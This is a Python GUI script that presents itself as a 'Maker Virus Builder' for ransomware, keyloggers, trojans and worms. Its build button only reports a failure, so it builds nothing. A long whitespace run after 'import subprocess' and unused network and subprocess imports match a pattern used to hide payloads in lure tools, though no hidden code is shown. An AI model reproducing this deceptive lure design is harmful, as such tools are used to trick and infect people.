import customtkinter as ctk
from tkinter import messagebox
import os
import requests
import subprocess                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         


ctk.set_appearance_mode("dark")
ctk.set_default_color_theme("dark-blue")

app = ctk.CTk()
app.title("Maker Virus Builder")
app.geometry("600x500")

def update_inputs(event):
    for widget in config_frame.winfo_children():
        widget.destroy()

    selected_type = virus_type_var.get()
    
    if selected_type == "Ransomware":
        ctk.CTkLabel(config_frame, text="Decryption Key:").pack(anchor="w", padx=10, pady=5)
        decryption_key_entry = ctk.CTkEntry(config_frame, placeholder_text="Enter decryption key...")
        decryption_key_entry.pack(fill="x", padx=10, pady=5)

    elif selected_type == "Keylogger":
        ctk.CTkLabel(config_frame, text="Webhook URL:").pack(anchor="w", padx=10, pady=5)
        webhook_entry = ctk.CTkEntry(config_frame, placeholder_text="Enter webhook URL...")
        webhook_entry.pack(fill="x", padx=10, pady=5)

    elif selected_type == "Trojan":
        ctk.CTkLabel(config_frame, text="Target File Path:").pack(anchor="w", padx=10, pady=5)
        target_file_entry = ctk.CTkEntry(config_frame, placeholder_text="Enter target file path...")
        target_file_entry.pack(fill="x", padx=10, pady=5)

    elif selected_type == "Worm":
        ctk.CTkLabel(config_frame, text="Spread Directory:").pack(anchor="w", padx=10, pady=5)
        spread_dir_entry = ctk.CTkEntry(config_frame, placeholder_text="Enter directory to spread...")
        spread_dir_entry.pack(fill="x", padx=10, pady=5)

def build_fake_virus():
    selected_type = virus_type_var.get()
    output_file = output_file_entry.get()
    messagebox.showinfo("maker Virus Built", f"ECHEC BUILD")

ctk.CTkLabel(app, text="Maker Virus Builder", font=("Arial", 20)).pack(pady=10)
ctk.CTkLabel(app, text="Choose Virus Type:").pack(anchor="w", padx=10)
virus_type_var = ctk.StringVar(value="Ransomware")
virus_types = ["Ransomware", "Keylogger", "Trojan", "Worm"]
virus_type_menu = ctk.CTkOptionMenu(app, variable=virus_type_var, values=virus_types, command=update_inputs)
virus_type_menu.pack(fill="x", padx=10, pady=5)

config_frame = ctk.CTkFrame(app)
config_frame.pack(fill="both", expand=True, padx=10, pady=10)

ctk.CTkLabel(app, text="Output File Name:").pack(anchor="w", padx=10)
output_file_entry = ctk.CTkEntry(app, placeholder_text="Enter file name...")
output_file_entry.pack(fill="x", padx=10, pady=5)

build_button = ctk.CTkButton(app, text="Build Virus", command=build_fake_virus)
build_button.pack(pady=20)

update_inputs(None)
app.mainloop()
